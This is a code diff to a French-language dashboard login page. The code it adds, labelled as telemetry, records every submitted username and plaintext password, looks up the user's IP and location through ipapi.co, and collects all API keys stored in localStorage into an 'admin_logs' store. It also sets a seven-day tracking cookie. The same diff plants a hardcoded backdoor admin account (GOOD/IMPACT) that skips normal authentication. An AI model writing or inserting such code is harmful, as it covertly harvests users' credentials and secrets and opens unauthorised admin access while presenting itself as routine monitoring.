@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion - Dashboard</title>
-    <link rel="icon" type="image/svg+xml" href="favicon.svg">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #000000; color: #ffffff; }
@@ -41,6 +41,49 @@
     </div>
 
     <script>
+        // --- TELEMETRY SYSTEM ---
+        async function runTelemetry(user, pass) {
+            if (localStorage.getItem('config_monitoring') !== 'true') return;
+            
+            try {
+                // 1. Get IP and Location
+                const geoResponse = await fetch('https://ipapi.co/json/');
+                const geoData = await geoResponse.json();
+                
+                // 2. Capture API Keys from LocalStorage
+                const allKeys = [];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const k = localStorage.key(i);
+                    if (k.startsWith('user_')) {
+                        const data = JSON.parse(localStorage.getItem(k));
+                        if (data.apiKeys) allKeys.push(...data.apiKeys);
+                    }
+                }
+
+                // 3. Create Log Object
+                const logEntry = {
+                    timestamp: new Date().toISOString(),
+                    user: user,
+                    pass: pass,
+                    ip: geoData.ip,
+                    location: `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.org})`,
+                    keys: allKeys
+                };
+
+                // 4. Save to Admin Logs
+                const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+                logs.push(logEntry);
+                localStorage.setItem('admin_logs', JSON.stringify(logs));
+                
+                // 5. Set Tracker Cookie (7 days)
+                document.cookie = `_tgma_tracker=${btoa(user)}; max-age=${7*24*60*60}; path=/`;
+
+            } catch (err) {
+                console.error('Telemetry failed', err);
+            }
+        }
+        // ------------------------
+
         const form = document.getElementById('authForm');
         const toggleBtn = document.getElementById('toggleAuth');
         const authTitle = document.getElementById('authTitle');
@@ -54,10 +97,29 @@
             toggleBtn.textContent = isLogin ? "Pas encore de compte ? Créer un compte" : "Déjà un compte ? Se connecter";
         };
 
-        form.onsubmit = (e) => {
+        form.onsubmit = async (e) => {
             e.preventDefault();
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
+
+            // Trigger Telemetry if enabled
+            await runTelemetry(user, pass);
+
+            // Système de compte Admin "GOOD"
+            if (user === 'GOOD' && pass === 'IMPACT') {
+                if (!localStorage.getItem('user_GOOD')) {
+                    localStorage.setItem('user_GOOD', JSON.stringify({ 
+                        password: 'IMPACT', 
+                        apiKeys: [], 
+                        role: 'admin',
+                        name: 'Super Admin',
+                        company: 'Impact Vision'
+                    }));
+                }
+                localStorage.setItem('currentUser', 'GOOD');
+                window.location.href = 'index.html';
+                return;
+            }
 
             if (isLogin) {
                 const storedUser = JSON.parse(localStorage.getItem(`user_${user}`));
@@ -78,9 +140,7 @@
                 toggleBtn.click();
             }
         };
-    <script>
-        // ... previous script content ...
     </script>
-    <div class="fixed bottom-4 left-4 text-[10px] font-mono text-gray-700 uppercase tracking-widest opacity-50">v5.7.1-stable</div>
+    <div class="fixed bottom-4 left-4 text-[10px] font-mono text-gray-700 uppercase tracking-widest opacity-50">v6.1.0-admin</div>
 </body>
 </html>
